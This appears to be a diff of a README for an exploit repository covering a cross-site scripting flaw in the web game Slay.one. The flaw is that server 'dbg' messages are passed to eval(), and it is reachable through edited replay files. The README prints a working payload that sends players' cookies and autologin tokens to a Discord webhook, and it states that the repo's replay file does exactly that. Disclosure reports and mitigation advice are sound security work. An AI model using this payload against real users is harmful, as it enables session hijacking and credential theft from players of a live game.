@@ -1,27 +1,55 @@
-# dbg-expliot
 
-### Introduction 
-Slay.one is a top down pixel shooter on the web. Howeever, like many web apppilcations it can be vulerible to cross-site sripting attacks.
+![Logo](./logo.png)
 
-### PoC 
-Within the slay.one client-bundle.js, the section of code that handles websocket messages from the server there is a few lines of code that put the user in jepordy. 
+# Exploit Report 'dbg' 
+---
+## Introduction 
+[Slay.one](https://slay.one) is a popular web-based, top-down pixel shooter game. Despite its engaging gameplay, it suffers from a serious vulnerability that exposes users to cross-site scripting (XSS) attacks. This report outlines the nature of the vulnerability, how it can be exploited, and recommendations for mitigating the risk.
+
+## Proof of Concept (PoC)
+The vulnerability resides in the `client-bundle.js` file, specifically in the code responsible for processing WebSocket messages from the server. The problematic section of code is as follows:
 
 ```javascript
-else if ("dbg" === arr[0]) // dbg packet send from the server 
+else if ("dbg" === arr[0]) // 'dbg' packet sent from the server
     try {
-        eval(msg.substring(4)) // eval() can be used to execute code 
+        eval(msg.substring(4)); // eval() allows arbitrary code execution
     } catch (e) {}
 ```
 
-This can be explioted with slay.one's replay feature where users can download replays of thier games. However, replay's can be editted to execute malicous code on the brower.
+Here, the use of `eval()` poses a critical security risk, as it allows the execution of arbitrary JavaScript code passed within WebSocket messages.
 
-As a proof of concept the replay.json file in the repo if viewed on slay.one will steal your cookies and send it to a discord webhook 
+### Exploitation
+Attackers can exploit this vulnerability using Slay.one's replay feature, which lets users download and upload game replays. A replay file can be modified to include malicious code that executes in the victim’s browser when the file is uploaded and viewed.
 
+### Proof of Concept Code
+The following example demonstrates how an attacker could edit a replay file to exploit this vulnerability. When the replay is loaded, the malicious code steals the user’s cookies and authentication tokens, sending them to a Discord webhook.
+
+#### Malicious Code Example
 ```javascript
-dbg$fetch('https://discord.com/api/webhooks/{webhookID}/{webhookToken}{
-    method: 
-        'POST',headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({content: 'Stolen Cookies: ' 
-    + document.cookie + 'Login' + localStorage.autologin})
+dbg$fetch('https://discord.com/api/webhooks/{webhookID}/{webhookToken}', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+        content: 'Stolen Cookies: ' + document.cookie + 
+                 ' Login Token: ' + localStorage.autologin
+    })
 });
 ```
+
+### Impact
+Exploiting this vulnerability allows attackers to:
+1. **Hijack user sessions**: Stolen cookies can be used to impersonate users.
+2. **Steal sensitive information**: Attackers can access authentication tokens stored in `localStorage`.
+3. **Execute arbitrary code**: This can lead to additional compromises, including malware delivery or unauthorized actions.
+
+## Recommendations for Mitigation
+To address this vulnerability and improve overall security, the following measures are recommended:
+
+1. **Eliminate `eval()` usage**: 
+2. **Validate and sanitize inputs**
+3. **Implement Content Security Policy (CSP)**
+4. **Enhance WebSocket security**: 
+
+---
+
+By implementing these measures, Slay.one can significantly reduce the risk of XSS attacks, providing a safer and more secure experience for its players.
